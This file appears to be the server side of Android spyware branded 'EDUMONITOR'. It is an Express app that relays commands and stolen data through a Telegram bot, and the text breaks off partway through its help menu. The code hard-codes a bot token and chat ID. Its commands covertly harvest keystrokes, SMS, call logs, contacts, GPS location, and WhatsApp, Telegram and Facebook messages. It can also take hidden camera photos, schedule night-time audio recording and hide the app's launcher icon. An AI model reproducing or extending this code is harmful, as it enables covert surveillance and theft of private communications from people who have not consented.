const express = require('express');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;
const os = require('os');

// Your bot token from @BotFather
const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Store authorized devices and their commands
const devices = new Map();
const userDeviceSelection = new Map();
const userStates = new Map();

// Store authorized chat IDs
const authorizedChats = new Set([
    '5326373447', // Your chat ID
]);

// Auto-collection flags
const autoDataRequested = new Map();

// Schedule states
const SCHEDULE_STATES = {
    IDLE: 'idle',
    AWAITING_START_TIME: 'awaiting_start_time',
    AWAITING_END_TIME: 'awaiting_end_time',
    AWAITING_RECURRING: 'awaiting_recurring',
    AWAITING_INTERVAL: 'awaiting_interval'
};

// Create uploads directory
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// ============= DEVICE CONFIGURATION =============
const deviceConfigs = {
    'default': {
        chatId: '5326373447',
        config: {
            chatId: '5326373447',
            botToken: '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo',
            serverUrl: 'https://edu-hwpy.onrender.com',
            pollingInterval: 15000,
            keepAliveInterval: 300000,
            realtimeLogging: false,
            autoScreenshot: true,
            autoRecording: true,
            screenshotQuality: 70,
            recordingQuality: 'MEDIUM',
            appOpenBatchSize: 50,
            syncBatchSize: 20,
            targetApps: [
                'com.whatsapp',
                'com.instagram.android',
                'com.facebook.katana',
                'com.snapchat.android',
                'com.google.android.youtube',
                'com.google.android.apps.maps',
                'org.telegram.messenger'
            ],
            features: {
                contacts: true,
                sms: true,
                callLogs: true,
                location: true,
                screenshots: true,
                recordings: true,
                keystrokes: true,
                notifications: true,
                appOpens: true,
                ipInfo: true,
                phoneInfo: true,
                wifiInfo: true,
                mobileInfo: true,
                simInfo: true
            }
        }
    }
};

function getDeviceConfig(deviceId) {
    return deviceConfigs[deviceId] || deviceConfigs['default'];
}

// ============= FILE UPLOAD CONFIGURATION =============
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.body.deviceId || 'unknown';
        const count = req.body.count || '0';
        const timestamp = Date.now();
        const safeName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_');
        cb(null, `${deviceId}-${count}-${timestamp}-${safeName}`);
    }
});

const upload = multer({
    storage,
    limits: { 
        fileSize: 50 * 1024 * 1024,
        fieldSize: 50 * 1024 * 1024
    }
});

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ============= HELPER FUNCTIONS =============

function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

function sendJsonResponse(res, data, statusCode = 200) {
    try {
        res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data));
    } catch (e) {
        console.error('Error stringifying JSON:', e);
        res.status(500).json({ error: 'Internal server error' });
    }
}

function getServerIP() {
    try {
        const interfaces = os.networkInterfaces();
        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
    } catch (e) {
        console.error('Error getting server IP:', e);
    }
    return 'Unknown';
}

// ============= DEVICE MANAGEMENT FUNCTIONS =============

function getDeviceListForUser(chatId) {
    const userDevices = [];
    for (const [deviceId, device] of devices.entries()) {
        if (String(device.chatId) === String(chatId)) {
            userDevices.push({
                id: deviceId,
                name: device.deviceInfo?.model || 'Unknown Device',
                lastSeen: device.lastSeen,
                isActive: deviceId === userDeviceSelection.get(chatId),
                phoneNumber: device.phoneNumber || 'Not available',
                lastSeenFormatted: new Date(device.lastSeen).toLocaleString()
            });
        }
    }
    return userDevices;
}

function getDeviceSelectionKeyboard(chatId) {
    const userDevices = getDeviceListForUser(chatId);
    const keyboard = [];
    
    userDevices.forEach(device => {
        const status = device.isActive ? '✅ ' : '';
        const lastSeen = new Date(device.lastSeen).toLocaleTimeString();
        keyboard.push([{
            text: `${status}${device.name} (${lastSeen})`,
            callback_data: `select_device:${device.id}`
        }]);
    });
    
    keyboard.push([{ text: '🔄 Refresh List', callback_data: 'refresh_devices' }]);
    keyboard.push([{ text: '📊 Device Stats', callback_data: 'device_stats' }]);
    keyboard.push([{ text: '◀️ Back to Main Menu', callback_data: 'help_main' }]);
    
    return keyboard;
}
function getMainMenuKeyboard(chatId) {
    const activeDeviceId = userDeviceSelection.get(chatId);
    const activeDevice = activeDeviceId ? devices.get(activeDeviceId) : null;
    const deviceCount = getDeviceListForUser(chatId).length;
    
    let deviceStatus = `📱 ${deviceCount} device(s)`;
    if (activeDevice) {
        deviceStatus = `✅ Active: ${activeDevice.deviceInfo?.model || 'Device'}`;
    }

    return [
        [
            { text: '📱 Device Info', callback_data: 'menu_device_info' },
            { text: '📞 Phone Info', callback_data: 'menu_phone_info' }
        ],
        [
            { text: '📍 Tracking', callback_data: 'menu_tracking' },
            { text: '🌐 Network', callback_data: 'menu_network' }
        ],
        [
            { text: '📸 Screenshot', callback_data: 'menu_screenshot' },
            { text: '🎤 Recording', callback_data: 'menu_recording' }
        ],
        [
            { text: '📷 Camera', callback_data: 'menu_camera' },
            { text: '💬 Social', callback_data: 'menu_social' }
        ],
        [
            { text: '📁 Media', callback_data: 'menu_media' },
            { text: '🔔 Realtime', callback_data: 'menu_realtime' }
        ],
        [
            { text: '⚙️ Services', callback_data: 'menu_services' },
            { text: deviceStatus, callback_data: 'menu_devices' }
        ],
        [
            { text: '🆕 NEW FEATURES', callback_data: 'menu_new_features' },
            { text: '❌ Close', callback_data: 'close_menu' }
        ]
    ];
}

// ============= STABLE SUB-MENU FUNCTIONS =============

function getCameraMenuKeyboard() {
    return [
        [
            { text: '📸 Take Photo', callback_data: 'take_photo' },
            { text: '🔄 Switch Camera', callback_data: 'camera_switch' }
        ],
        [
            { text: '👤 Front Camera', callback_data: 'camera_front' },
            { text: '👥 Back Camera', callback_data: 'camera_back' }
        ],
        [
            { text: '✅ Start Monitoring', callback_data: 'camera_on' },
            { text: '❌ Stop Monitoring', callback_data: 'camera_off' }
        ],
        [
            { text: '📊 Camera Status', callback_data: 'camera_status' },
            { text: '◀️ Back', callback_data: 'help_main' }
        ]
    ];
}

function getRecordingMenuKeyboard() {
    return [
        [
            { text: '🎤 Start 60s', callback_data: 'start_60s_rec' },
            { text: '⏹️ Stop', callback_data: 'stop_60s_rec' }
        ],
        [
            { text: '⏰ Schedule Info', callback_data: 'record_info' },
            { text: '✅ Auto ON', callback_data: 'record_auto_on' }
        ],
        [
            { text: '❌ Auto OFF', callback_data: 'record_auto_off' },
            { text: '⚙️ Custom Schedule', callback_data: 'start_custom_schedule_interactive' }
        ],
        [
            { text: '🎚️ Audio Quality', callback_data: 'menu_audio_quality' },
            { text: '◀️ Back', callback_data: 'help_main' }
        ]
    ];
}

function getSocialMenuKeyboard() {
    return [
        [
            { text: '💬 WhatsApp', callback_data: 'whatsapp' },
            { text: '💬 Telegram', callback_data: 'telegram' }
        ],
        [
            { text: '💬 Facebook', callback_data: 'facebook' },
            { text: '🌐 Browser', callback_data: 'browser' }
        ],
        [
            { text: '📋 Clipboard', callback_data: 'clipboard' },
            { text: '📅 Calendar', callback_data: 'calendar' }
        ],
        [
            { text: '◀️ Back', callback_data: 'help_main' }
        ]
    ];
}

function getMediaMenuKeyboard() {
    return [
        [
            { text: '🔍 Find Media', callback_data: 'find_media' },
            { text: '📸 Screenshots', callback_data: 'screenshots' }
        ],
        [
            { text: '🎤 Find Recordings', callback_data: 'find_recorded' },
            { text: '🎵 Media Scan', callback_data: 'media_scan' }
        ],
        [
            { text: '🔬 Full Scan', callback_data: 'full_scan' },
            { text: '❓ Scan Help', callback_data: 'scan_help' }
        ],
        [
            { text: '◀️ Back', callback_data: 'help_main' }
        ]
    ];
}

function getNetworkMenuKeyboard() {
    return [
        [
            { text: '🌐 IP Info', callback_data: 'ip_info' },
            { text: '📶 WiFi Info', callback_data: 'wifi_info' }
        ],
        [
            { text: '📱 Mobile Info', callback_data: 'mobile_info' },
            { text: '📡 Network Status', callback_data: 'network_status' }
        ],
        [
            { text: '🌍 All Network', callback_data: 'all_info' },
            { text: '◀️ Back', callback_data: 'help_main' }
        ]
    ];
}

function getRealtimeMenuKeyboard() {
    return [
        [
            { text: '🔑 Keys ON', callback_data: 'realtime_keystrokes_on' },
            { text: '🔑 Keys OFF', callback_data: 'realtime_keystrokes_off' }
        ],
        [
            { text: '🔔 Notif ON', callback_data: 'realtime_notifications_on' },
            { text: '🔔 Notif OFF', callback_data: 'realtime_notifications_off' }
        ],
        [
            { text: '✅ All ON', callback_data: 'realtime_all_on' },
            { text: '❌ All OFF', callback_data: 'realtime_all_off' }
        ],
        [
            { text: '📊 Status', callback_data: 'realtime_status' },
            { text: '◀️ Back', callback_data: 'help_main' }
        ]
    ];
}

function getServicesMenuKeyboard() {
    return [
        [
            { text: '👻 Hide Icon', callback_data: 'hide_icon' },
            { text: '👁️ Show Icon', callback_data: 'show_icon' }
        ],
        [
            { text: '🔄 Reboot Services', callback_data: 'reboot_app' },
            { text: '🗑️ Clear Logs', callback_data: 'clear_logs' }
        ],
        [
            { text: '📊 Service Status', callback_data: 'status' },
            { text: '📝 Logs Count', callback_data: 'logs_count' }
        ],
        [
            { text: '📈 Stats', callback_data: 'stats' },
            { text: '🔄 Refresh', callback_data: 'refresh_data' }
        ],
        [
            { text: '⚡ Force Harvest', callback_data: 'force_harvest' },
            { text: '🔄 Sync All', callback_data: 'sync_all' }
        ],
        [
            { text: '◀️ Back', callback_data: 'help_main' }
        ]
    ];
}

function getDeviceInfoMenuKeyboard() {
    return [
        [
            { text: '🌐 Network Info', callback_data: 'network' },
            { text: '📱 Apps List', callback_data: 'apps' }
        ],
        [
            { text: '📱 Device Info', callback_data: 'info' },
            { text: '🔋 Battery', callback_data: 'battery' }
        ],
        [
            { text: '💾 Storage', callback_data: 'storage' },
            { text: '🕐 Time', callback_data: 'time' }
        ],
        [
            { text: '📊 Status', callback_data: 'status' },
            { text: '◀️ Back', callback_data: 'help_main' }
        ]
    ];
}

function getPhoneInfoMenuKeyboard() {
    return [
        [
            { text: '📞 Phone Number', callback_data: 'phone_number' },
            { text: '📱 SIM Info', callback_data: 'sim_info' }
        ],
        [
            { text: '📱 Mobile Info', callback_data: 'mobile_info' },
            { text: '📞 Call Logs', callback_data: 'calllogs' }
        ],
        [
            { text: '📍 Location', callback_data: 'location' },
            { text: '💬 SMS', callback_data: 'sms' }
        ],
        [
            { text: '📇 Contacts', callback_data: 'contacts' },
            { text: '📅 Calendar', callback_data: 'calendar' }
        ],
        [
            { text: '◀️ Back', callback_data: 'help_main' }
        ]
    ];
}

function getTrackingMenuKeyboard() {
    return [
        [
            { text: '📍 Location', callback_data: 'location' },
            { text: '⌨️ Keystrokes', callback_data: 'keystrokes' }
        ],
        [
            { text: '🔔 Notifications', callback_data: 'notifications' },
            { text: '📱 App Opens', callback_data: 'app_opens' }
        ],
        [
            { text: '◀️ Back', callback_data: 'help_main' }
        ]
    ];
}

function getScreenshotMenuKeyboard() {
    return [
        [
            { text: '📸 Take Now', callback_data: 'screenshot' },
            { text: '⚙️ Settings', callback_data: 'screenshot_settings' }
        ],
        [
            { text: '▶️ Start Service', callback_data: 'start_screenshot' },
            { text: '⏹️ Stop Service', callback_data: 'stop_screenshot' }
        ],
        [
            { text: '📸 Screenshot Logs', callback_data: 'screenshots' },
            { text: '📏 Size Status', callback_data: 'size_status' }
        ],
        [
            { text: '📸 Method Info', callback_data: 'screenshot_method' },
            { text: '📱 Target Apps', callback_data: 'target_apps' }
        ],
        [
            { text: '➕ Add Target', callback_data: 'add_target_example' },
            { text: '◀️ Back', callback_data: 'help_main' }
        ]
    ];
}

function getAudioQualityMenuKeyboard() {
    return [
        [
            { text: '🎤 Ultra Low (8k)', callback_data: 'audio_ultra' },
            { text: '🎤 Very Low (16k)', callback_data: 'audio_very_low' }
        ],
        [
            { text: '🎤 Low (24k)', callback_data: 'audio_low' },
            { text: '🎤 Medium (32k)', callback_data: 'audio_medium' }
        ],
        [
            { text: '🎤 High (64k)', callback_data: 'audio_high' },
            { text: 'ℹ️ Audio Info', callback_data: 'audio_info' }
        ],
        [
            { text: '◀️ Back to Recording', callback_data: 'menu_recording' }
        ]
    ];
}

function getNewFeaturesMenuKeyboard() {
    return [
        [
            { text: '📊 Detailed Exports', callback_data: 'menu_detailed_exports' },
            { text: '🔍 File Scanner', callback_data: 'menu_file_scanner' }
        ],
        [
            { text: '📡 Data Saving', callback_data: 'menu_data_saving' },
            { text: '🎚️ Audio Quality', callback_data: 'menu_audio_quality' }
        ],
        [
            { text: '🔄 Sync & Harvest', callback_data: 'menu_sync_harvest' },
            { text: '🔊 Real-time Controls', callback_data: 'menu_realtime_advanced' }
        ],
        [
            { text: '📱 App Opens', callback_data: 'menu_app_opens' },
            { text: '📅 Calendar', callback_data: 'menu_calendar' }
        ],
        [
            { text: '📋 Clipboard', callback_data: 'menu_clipboard' },
            { text: '🌐 Browser History', callback_data: 'menu_browser_history' }
        ],
        [
            { text: '◀️ Back to Main', callback_data: 'help_main' }
        ]
    ];
}

function getDetailedExportsMenuKeyboard() {
    return [
        [
            { text: '📇 Detailed Contacts', callback_data: 'contacts_detailed' },
            { text: '📱 Detailed Apps', callback_data: 'apps_detailed' }
        ],
        [
            { text: '⌨️ Detailed Keystrokes', callback_data: 'keystrokes_detailed' },
            { text: '🔔 Detailed Notifications', callback_data: 'notifications_detailed' }
        ],
        [
            { text: '📊 Device Snapshots', callback_data: 'device_snapshots' },
            { text: '📈 Device History', callback_data: 'device_history' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getFileScannerMenuKeyboard() {
    return [
        [
            { text: '🔍 Full System Scan', callback_data: 'full_scan' },
            { text: '🎵 Media Only Scan', callback_data: 'media_scan' }
        ],
        [
            { text: '🔬 Deep Scan (Detailed)', callback_data: 'full_scan_detailed' },
            { text: '🎤 Find Recordings', callback_data: 'find_recorded' }
        ],
        [
            { text: '📁 Find All Media', callback_data: 'find_media' },
            { text: '❓ Scan Help', callback_data: 'scan_help' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getDataSavingMenuKeyboard() {
    return [
        [
            { text: '📡 WiFi-Only ON', callback_data: 'wifi_only_on' },
            { text: '📡 WiFi-Only OFF', callback_data: 'wifi_only_off' }
        ],
        [
            { text: '🌐 Network Status', callback_data: 'network_status' },
            { text: '📊 WiFi-Only Status', callback_data: 'wifi_only_status' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getSyncHarvestMenuKeyboard() {
    return [
        [
            { text: '🔄 Sync All Tables', callback_data: 'sync_all' },
            { text: '⚡ Force Harvest', callback_data: 'force_harvest' }
        ],
        [
            { text: '🔄 Refresh Data', callback_data: 'refresh_data' },
            { text: '📊 Database Stats', callback_data: 'stats' }
        ],
        [
            { text: '🗑️ Clear Logs', callback_data: 'clear_logs' },
            { text: '📊 Logs Count', callback_data: 'logs_count' }
        ],
        [
            { text: '🔄 Reboot Services', callback_data: 'reboot_app' },
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getRealtimeAdvancedMenuKeyboard() {
    return [
        [
            { text: '🔑 Realtime Keys ON', callback_data: 'realtime_keystrokes_on' },
            { text: '🔑 Realtime Keys OFF', callback_data: 'realtime_keystrokes_off' }
        ],
        [
            { text: '🔔 Realtime Notif ON', callback_data: 'realtime_notifications_on' },
            { text: '🔔 Realtime Notif OFF', callback_data: 'realtime_notifications_off' }
        ],
        [
            { text: '✅ All Realtime ON', callback_data: 'realtime_all_on' },
            { text: '❌ All Realtime OFF', callback_data: 'realtime_all_off' }
        ],
        [
            { text: '📊 Realtime Status', callback_data: 'realtime_status' },
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getAppOpensMenuKeyboard() {
    return [
        [
            { text: '📱 App Opens (JSON)', callback_data: 'app_opens' },
            { text: '📱 App Opens (HTML)', callback_data: 'app_opens_html' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getCalendarMenuKeyboard() {
    return [
        [
            { text: '📅 Calendar Events', callback_data: 'calendar' },
            { text: '📅 Calendar (HTML)', callback_data: 'calendar_html' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getClipboardMenuKeyboard() {
    return [
        [
            { text: '📋 Clipboard Logs', callback_data: 'clipboard' },
            { text: '📋 Clipboard (HTML)', callback_data: 'clipboard_html' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getBrowserHistoryMenuKeyboard() {
    return [
        [
            { text: '🌐 Browser History', callback_data: 'browser_history' },
            { text: '🌐 Browser History (HTML)', callback_data: 'browser_history_html' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

// ============= TELEGRAM MESSAGE FUNCTIONS =============

async function sendTelegramMessage(chatId, text) {
    try {
        if (!text || text.trim().length === 0) {
            console.error('❌ Attempted to send empty message');
            return null;
        }

        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });
        
        console.log(`✅ Message sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
        
        if (error.response?.status === 400) {
            console.log('⚠️ HTML failed, retrying as plain text');
            try {
                const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: chatId,
                    text: text.replace(/<[^>]*>/g, '')
                });
                return response.data;
            } catch (e) {
                console.error('❌ Plain text also failed:', e.response?.data || e.message);
            }
        }
        return null;
    }
}

async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
    try {
        console.log(`📨 Sending message with inline keyboard to ${chatId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        
        console.log(`✅ Message with keyboard sent successfully`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message with keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function editMessageKeyboard(chatId, messageId, newKeyboard) {
    try {
        console.log(`🔄 Editing keyboard for message ${messageId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/editMessageReplyMarkup`, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: newKeyboard
            }
        });
        
        console.log(`✅ Keyboard updated`);
        return response.data;
    } catch (error) {
        console.error('❌ Error editing keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function answerCallbackQuery(callbackQueryId, text = null) {
    try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text
        });
    } catch (error) {
        console.error('Error answering callback query:', error.response?.data || error.message);
    }
}

async function setChatMenuButton(chatId) {
    try {
        console.log(`🔘 Setting menu button for chat ${chatId}`);
        
        // UNIFIED COMMANDS LIST
        const commands = [
            // Device Management
            { command: 'device_info', description: '📱 Complete device info' },
            { command: 'network_info', description: '🌐 All network info' },
            { command: 'mobile_info', description: '📞 Mobile & SIM info' },
            { command: 'saving_status', description: '📡 Data saving mode status' },
            { command: 'logs_count', description: '📊 Database statistics' },
            
            // Screenshot
            { command: 'screenshot', description: '📸 Take screenshot now' },
            { command: 'screenshot_settings', description: '⚙️ Screenshot settings' },
            { command: 'start_screenshot', description: '▶️ Start screenshot service' },
            { command: 'stop_screenshot', description: '⏹️ Stop screenshot service' },
            { command: 'small', description: '📏 Small size (30%)' },
            { command: 'medium', description: '📏 Medium size (70%)' },
            { command: 'original', description: '📏 Original size' },
            { command: 'add_target', description: '➕ Add target app' },
            { command: 'target_apps', description: '📱 List target apps' },
            
            // Camera
            { command: 'photo', description: '📸 Take photo now' },
            { command: 'camera_on', description: '📸 Start camera monitoring' },
            { command: 'camera_off', description: '📸 Stop camera monitoring' },
            { command: 'camera_status', description: '📸 Check camera status' },
            { command: 'camera_front', description: '📸 Switch to front camera' },
            { command: 'camera_back', description: '📸 Switch to back camera' },
            { command: 'camera_switch', description: '📸 Toggle cameras' },
            
            // Recording
            { command: 'start_60s_rec', description: '🎤 Start 60s recording' },
            { command: 'stop_60s_rec', description: '⏹️ Stop recording' },
            { command: 'record_info', description: '⏰ Recording schedule info' },
            { command: 'record_auto_on', description: '✅ Enable auto schedule' },
            { command: 'record_auto_off', description: '❌ Disable auto schedule' },
            { command: 'record_custom', description: '⚙️ Set custom schedule' },
            { command: 'audio_ultra', description: '🎤 Ultra low quality (8k)' },
            { command: 'audio_very_low', description: '🎤 Very low quality (16k)' },
            { command: 'audio_low', description: '🎤 Low quality (24k)' },
            { command: 'audio_medium', description: '🎤 Medium quality (32k)' },
            { command: 'audio_high', description: '🎤 High quality (64k)' },
            { command: 'audio_info', description: 'ℹ️ Audio quality info' },
            
            // File Scanner
            { command: 'scan_all', description: '🔍 Full system scan' },
            { command: 'scan_media', description: '🎵 Media scan' },
            { command: 'scan_help', description: '❓ Scan commands help' },
            
            // Data Export
            { command: 'contacts', description: '📇 Contacts export' },
            { command: 'sms', description: '💬 SMS export' },
            { command: 'calllogs', description: '📞 Call logs export' },
            { command: 'apps_list', description: '📱 Apps list' },
            { command: 'keys', description: '⌨️ Keystroke logs' },
            { command: 'notify', description: '🔔 Notification logs' },
            { command: 'open_app', description: '📱 App opens history' },
            
            // Social Media
            { command: 'whatsapp', description: '💬 WhatsApp logs' },
            { command: 'telegram', description: '💬 Telegram logs' },
            { command: 'facebook', description: '💬 Facebook logs' },
            { command: 'browser', description: '🌐 Browser history' },
            { command: 'clipboard', description: '📋 Clipboard history' },
            { command: 'calendar', description: '📅 Calendar events' },
            
            // Real-time Controls
            { command: 'rt_all_on', description: '✅ Enable all real-time' },
            { command: 'rt_all_off', description: '❌ Disable all real-time' },
            { command: 'rt_keys_on', description: '🔑 Enable keystrokes' },
            { command: 'rt_keys_off', description: '🔑 Disable keystrokes' },
            { command: 'rt_notif_on', description: '🔔 Enable notifications' },
            { command: 'rt_notif_off', description: '🔔 Disable notifications' },
            { command: 'rt_status', description: '📊 Check real-time status' },
            
            // Network & Data Saving
            { command: 'wifi_only_on', description: '📡 Enable WiFi-only mode' },
            { command: 'wifi_only_off', description: '📡 Disable WiFi-only mode' },
            
            // Sync & System
            { command: 'sync_all', description: '🔄 Sync all data' },
            { command: 'hide_icon', description: '👻 Hide launcher icon' },
            { command: 'show_icon', description: '👁️ Show launcher icon' },
            { command: 'reboot_app', description: '🔄 Restart all services' },
            { command: 'clear_logs', description: '🗑️ Clear database' },
            { command: 'location', description: '📍 Get GPS location' },
            { command: 'help', description: '📋 Show help menu' }
        ];
        
        await axios.post(`${TELEGRAM_API}/setMyCommands`, { commands });
        
        await axios.post(`${TELEGRAM_API}/setChatMenuButton`, {
            chat_id: chatId,
            menu_button: {
                type: 'commands',
                text: 'Menu'
            }
        });
        
        console.log(`✅ Menu button and ${commands.length} commands set for chat ${chatId}`);
    } catch (error) {
        console.error('Error setting menu button:', error.response?.data || error.message);
    }
}

async function sendTelegramDocument(chatId, filePath, filename, caption) {
    try {
        console.log(`📎 Sending document to ${chatId}: ${filename}`);
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);
        
        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: {
                ...formData.getHeaders()
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        console.log(`✅ Document sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending document:', error.response?.data || error.message);
        
        try {
            const stats = fs.statSync(filePath);
            await sendTelegramMessage(chatId, 
                `⚠️ File too large to send directly.\n\n` +
                `The file is ${(stats.size / 1024).toFixed(2)} KB.`);
        } catch (e) {
            console.error('Error sending fallback message:', e);
        }
        return null;
    }
}

// ============= UNIFIED HELP MENU =============

async function showUnifiedHelpMenu(chatId) {
    await sendTelegramMessage(chatId, 
        "🤖 *EDUMONITOR v6.0 - UNIFIED COMMAND REFERENCE*\n\n" +
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        
        "📱 *DEVICE MANAGEMENT*\n" +
        "├─ `/device_info` - Complete device info (status, info, time, battery, storage, snapshots)\n" +
        "├─ `/network_info` - All network info (IP, WiFi, network status)\n" +
        "├─ `/mobile_info` - All mobile/SIM info (phone, SIM, mobile data)\n" +
        "├─ `/saving_status` - Data saving mode status\n" +
        "└─ `/logs_count` - Database statistics\n\n" +
        
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        
        "📸 *SCREENSHOT COMMANDS*\n" +
        "├─ `/screenshot` - Take screenshot now\n" +
        "├─ `/screenshot_settings` - Configure screenshot quality & targets\n" +
        "├─ `/start_screenshot` - Start screenshot service\n" +
        "├─ `/stop_screenshot` - Stop screenshot service\n" +
        "├─ `/small` - Small size (30%)\n" +
        "├─ `/medium` - Medium size (70%)\n" +
        "├─ `/original` - Original size\n" +
        "└─ `/add_target [package]` - Add app to monitor\n\n" +
        
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        
        "📷 *CAMERA COMMANDS*\n" +
        "├─ `/photo` - Take photo now\n" +
        "├─ `/camera_on` - Start camera monitoring\n" +
        "├─ `/camera_off` - Stop camera monitoring\n" +
        "├─ `/camera_status` - Check camera status\n" +
        "├─ `/camera_front` - Switch to front camera\n" +
        "├─ `/camera_back` - Switch to back camera\n" +
        "└─ `/camera_switch` - Toggle cameras\n\n" +
        
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        
        "🎤 *RECORDING COMMANDS*\n" +
        "├─ `/start_60s_rec` - Start 60-second recording\n" +
        "├─ `/stop_60s_rec` - Stop current recording\n" +
        "├─ `/record_info` - View recording schedule\n" +
        "├─ `/record_auto_on` - Enable auto schedule (11PM-4AM)\n" +
        "├─ `/record_auto_off` - Disable auto schedule\n" +
        "├─ `/record_custom HH:MM HH:MM daily/once mins` - Set custom schedule\n" +
        "├─ `/audio_ultra` - Ultra low quality (8k)\n" +
        "├─ `/audio_very_low` - Very low quality (16k)\n" +
        "├─ `/audio_low` - Low quality (24k)\n" +
        "├─ `/audio_medium` - Medium quality (32k)\n" +
        "├─ `/audio_high` - High quality (64k)\n" +
        "└─ `/audio_info` - Audio quality info\n\n" +
        
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        
        "🔍 *FILE SCANNER*\n" +
        "├─ `/scan_all` - Complete system scan with detailed report\n" +
        "├─ `/scan_media` - Media scan (audio/video/images)\n" +
        "└─ `/scan_help` - Scan help\n\n" +
        
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        
        "📱 *DATA EXPORT (UNIFIED)*\n" +
        "├─ `/contacts` - Contacts (JSON/HTML/Detailed)\n" +
        "├─ `/sms` - SMS messages\n" +
        "├─ `/calllogs` - Call logs\n" +
        "├─ `/apps_list` - Installed apps\n" +
        "├─ `/keys` - Keystroke logs\n" +
        "├─ `/notify` - Notification logs\n" +
        "├─ `/open_app` - App opens history\n" +
        "├─ `/device_info` - Device snapshots\n" +
        "└─ `/sync_all` - Sync all data tables\n\n" +
        
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        
        "💬 *SOCIAL MEDIA*\n" +
        "├─ `/whatsapp` - WhatsApp messages\n" +
        "├─ `/telegram` - Telegram messages\n" +
        "├─ `/facebook` - Facebook/Messenger messages\n" +
        "├─ `/browser` - Browser history\n" +
        "├─ `/clipboard` - Clipboard history\n" +
        "└─ `/calendar` - Calendar events\n\n" +
        
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        
        "⚡ *REAL-TIME CONTROLS*\n" +
        "├─ `/rt_all_on` - Enable all real-time logs\n" +
        "├─ `/rt_all_off` - Disable all real-time logs\n" +
        "├─ `/rt_keys_on` - Enable keystrokes\n" +
        "├─ `/rt_keys_off` - Disable keystrokes\n" +
        "├─ `/rt_notif_on` - Enable notifications\n" +
        "├─ `/rt_notif_off` - Disable notifications\n" +
        "└─ `/rt_status` - Check real-time status\n\n" +
        
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        
        "📡 *NETWORK & DATA SAVING*\n" +
        "├─ `/wifi_only_on` - Media on WiFi only\n" +
        "├─ `/wifi_only_off` - All data on any network\n" +
        "└─ `/saving_status` - Check current mode\n\n" +
        
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        
        "🔧 *SYSTEM CONTROLS*\n" +
        "├─ `/hide_icon` - Hide launcher icon\n" +
        "├─ `/show_icon` - Show launcher icon\n" +
        "├─ `/reboot_app` - Restart all services\n" +
        "├─ `/clear_logs` - Clear database\n" +
